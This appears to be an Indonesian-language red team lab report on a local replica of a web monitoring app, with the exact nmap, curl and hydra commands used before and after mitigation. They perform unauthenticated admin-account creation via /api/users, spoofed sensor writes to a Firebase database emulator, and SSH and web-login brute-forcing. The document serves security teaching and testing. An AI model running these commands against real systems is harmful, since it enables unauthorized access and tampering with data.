# Attack Plan — Fase 2 & Verifikasi Siklus 2 (Target Node: PiRoTech Web Monitoring, 192.168.10.5)

> **Batasan Ruang Lingkup:** Seluruh skenario dijalankan oleh Red Team dari Attacker Node (`ATK-KEL10`, `192.168.10.100`) terhadap Target Node replika lokal (`serverpjblsiber`, `192.168.10.5`) pada subnet lab `192.168.10.0/24` dengan data dummy, dipantau secara real-time oleh Security Onion (`SOC-KEL10`, `192.168.10.200`).

---

## Tahap Reconnaissance (Pra-Eksploitasi)
* **Tools:** `ip a`, `ping`, `nmap`
* **Perintah Aktual:**
  * `ip a && ping -c 4 192.168.10.5`
  * `nmap -sV -sC -p- -T4 192.168.10.5 -oN 01_nmap_scan.txt`
* **Hasil Aktual:** 65.531 port TCP berstatus `filtered` oleh UFW; 4 port teridentifikasi `open`, yaitu `22/tcp` (OpenSSH 10.2p1 Ubuntu), `3000/tcp` (Next.js), `9000/tcp` (Firebase RTDB Emulator), dan `9099/tcp` (Firebase Auth Emulator).
* **Bukti:** [`evidence/00_ip_a_ping_target.png`](evidence/00_ip_a_ping_target.png), [`evidence/01_nmap_scan_ports.png`](evidence/01_nmap_scan_ports.png)

---

## Skenario 1 — Web/API: Akses Tanpa Autentikasi pada `/api/users`
* **Kategori:** Web/API/Protokol IoT (*Broken Access Control* — OWASP API1:2023)
* **Tools:** `curl`
* **Target & Celah Awal:** Endpoint `http://192.168.10.5:3000/api/users` memanggil Firebase Admin SDK tanpa memverifikasi Firebase ID Token maupun klaim peran `admin`.
* **Perintah Aktual & Hasil Siklus 1 (Before):**
  * `curl -s -i http://192.168.10.5:3000/api/users` → **`HTTP/1.1 200 OK`**, membocorkan akun admin `pirotechsvipb@gmail.com`.
  * `curl -s -i -X POST http://192.168.10.5:3000/api/users` (payload `redteam@attacker.local`, `role: admin`) → **`HTTP/1.1 201 Created`**, berhasil membuat akun admin ilegal `redteam_pwn`.
* **Hasil Verifikasi Siklus 2 (After Mitigasi):**
  * Seluruh metode (`GET`, `POST`, `PATCH`, `DELETE`) tanpa token ditolak dengan **`HTTP/1.1 401 Unauthorized`** (`{"error":"Unauthorized"}`).
* **Bukti:** [`evidence/02a_siklus1_api_users_get_200.png`](evidence/02a_siklus1_api_users_get_200.png), [`evidence/02b_siklus1_api_users_post_201.png`](evidence/02b_siklus1_api_users_post_201.png), [`evidence/05d_siklus2_api_users_401_headers.png`](evidence/05d_siklus2_api_users_401_headers.png), [`evidence/08_siklus2_verify_s1_all_methods_401.png`](evidence/08_siklus2_verify_s1_all_methods_401.png)

---

## Skenario 2 — Web/API/IoT: Penulisan Data Sensor Tanpa Autentikasi (RTDB Write Terbuka)
* **Kategori:** Web/API/Protokol IoT (*Telemetry Data Spoofing*)
* **Tools:** `curl` (HTTP REST injection ke Firebase RTDB Emulator)
* **Target & Celah Awal:** Aturan `firebase.rules.json` pada node `sensor_data`, `monitoring`, dan `contact/messages` memiliki `.write: true` tanpa autentikasi perangkat (*device-auth*).
* **Perintah Aktual & Hasil Siklus 1 (Before):**
  * `curl -s -i -X PUT "http://192.168.10.5:9000/sensor_data/redteam_spoof.json"` dengan payload `{"suhu":999.9,"tekanan":99.9,"status":"BAHAYA_SPOOFED_BY_REDTEAM"}` → **`HTTP/1.1 200 OK`**, data sensor palsu berhasil masuk.
* **Hasil Verifikasi Siklus 2 (After Mitigasi):**
  * **C1 (Namespace asli aplikasi):** `curl -s -i -X PUT "http://192.168.10.5:9000/sensor_data/redteam_spoof_s2.json?ns=demo-pirotech-default-rtdb"` → ditolak **`HTTP/1.1 401 Unauthorized`** (`{"error" : "Permission denied"}`).
  * **C2 (Pembanding tanpa `?ns=`):** Permintaan tanpa `?ns=` mengembalikan `200 OK` namun hanya mengarah ke namespace bawaan `X-Firebase-Project-Id: fake-server` (keterbatasan arsitektur emulator, tidak masuk ke database aplikasi PiRoTech).
* **Bukti:** [`evidence/03_siklus1_rtdb_spoof_200.png`](evidence/03_siklus1_rtdb_spoof_200.png), [`evidence/06_siklus2_rtdb_with_ns_401_denied.png`](evidence/06_siklus2_rtdb_with_ns_401_denied.png), [`evidence/09_siklus2_verify_s2_rtdb_401.png`](evidence/09_siklus2_verify_s2_rtdb_401.png)

---

## Skenario 3 — Reconnaissance & Exploitation: Brute-Force SSH & Web Login
* **Kategori:** Exploitation / Akses (didahului Reconnaissance)
* **Tools:** `nmap`, `Hydra`, `curl`
* **Target & Celah:** Layanan OpenSSH (`22/tcp`) dan endpoint login Firebase Auth Emulator (`9099/tcp`).
* **Perintah Aktual & Hasil:**
  * **SSH Brute-Force:** `hydra -l malmal -P ~/redteam-evidence/wordlist_kecil.txt -t 4 -V ssh://192.168.10.5` → langsung ditolak server dengan **`[ERROR] target ssh://192.168.10.5:22/ does not support password authentication (method reply 4)`** (SSH *key-only* aktif); IP `192.168.10.100` turut diblokir oleh `fail2ban` (`mode = aggressive`).
  * **Web Login Brute-Force (`:9099`):** 5 percobaan password ke `pirotechsvipb@gmail.com` pada `/identitytoolkit.googleapis.com/v1/accounts:signInWithPassword` → seluruhnya ditolak **`HTTP 400 INVALID_PASSWORD`**.
* **Bukti:** [`evidence/04_siklus1_hydra_ssh_rejected.png`](evidence/04_siklus1_hydra_ssh_rejected.png), [`evidence/07_siklus2_web_bruteforce_400.png`](evidence/07_siklus2_web_bruteforce_400.png), [`evidence/10_siklus2_verify_s3_hydra_ssh.png`](evidence/10_siklus2_verify_s3_hydra_ssh.png)
